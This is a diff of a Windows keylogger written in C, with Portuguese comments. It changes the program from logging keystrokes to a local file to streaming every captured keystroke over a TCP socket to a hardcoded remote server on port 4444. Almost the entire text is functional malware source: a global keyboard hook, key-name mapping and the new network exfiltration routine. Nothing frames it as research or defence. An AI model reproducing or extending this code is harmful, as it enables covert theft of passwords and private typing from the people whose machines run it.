@@ -1,10 +1,16 @@
 #include <stdio.h>
 #include <windows.h>
+#include <winsock2.h>
 
-HHOOK hook;  // Hook global
-FILE *logFile;
+#pragma comment(lib, "ws2_32.lib")
 
-// Mapeia teclas especiais para texto legível
+#define SERVER_IP "192.168.1.100"  // 🛑 Substitua pelo IP do servidor
+#define PORT 4444  // Porta usada para comunicação
+
+HHOOK hook;
+SOCKET sock;
+
+// Mapeia teclas especiais
 const char* getSpecialKey(DWORD vkCode) {
     switch (vkCode) {
         case VK_RETURN: return "[ENTER]";
@@ -16,32 +22,46 @@ const char* getSpecialKey(DWORD vkCode) {
         case VK_CAPITAL: return "[CAPS_LOCK]";
         case VK_ESCAPE: return "[ESC]";
         case VK_SPACE: return "[SPACE]";
-        case VK_LEFT: return "[LEFT_ARROW]";
-        case VK_RIGHT: return "[RIGHT_ARROW]";
-        case VK_UP: return "[UP_ARROW]";
-        case VK_DOWN: return "[DOWN_ARROW]";
+        case VK_LEFT: return "[LEFT]";
+        case VK_RIGHT: return "[RIGHT]";
+        case VK_UP: return "[UP]";
+        case VK_DOWN: return "[DOWN]";
         case VK_DELETE: return "[DEL]";
         default: return NULL;
     }
 }
 
-// Função chamada quando uma tecla for pressionada
+// Callback para capturar as teclas
 LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;
-        logFile = fopen("log.txt", "a+");
+        char buffer[64];
 
-        if (logFile != NULL) {
-            const char *specialKey = getSpecialKey(key->vkCode);
-            if (specialKey) {
-                fprintf(logFile, "%s ", specialKey);
-            } else {
-                fprintf(logFile, "%c", key->vkCode);
-            }
-            fclose(logFile);
+        const char *specialKey = getSpecialKey(key->vkCode);
+        if (specialKey) {
+            sprintf(buffer, "%s ", specialKey);
+        } else {
+            sprintf(buffer, "%c", key->vkCode);
         }
+
+        send(sock, buffer, strlen(buffer), 0);
     }
     return CallNextHookEx(hook, nCode, wParam, lParam);
+}
+
+// Conecta ao servidor
+void ConnectToServer() {
+    WSADATA wsa;
+    struct sockaddr_in serverAddr;
+
+    WSAStartup(MAKEWORD(2, 2), &wsa);
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PORT);
+    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
+
+    connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
 }
 
 // Configura o hook do teclado
@@ -54,12 +74,15 @@ void SetHook() {
     }
 }
 
-// Remove o hook ao fechar
+// Remove o hook
 void Unhook() {
     UnhookWindowsHookEx(hook);
+    closesocket(sock);
+    WSACleanup();
 }
 
 int main() {
+    ConnectToServer();
     SetHook();
     Unhook();
     return 0;
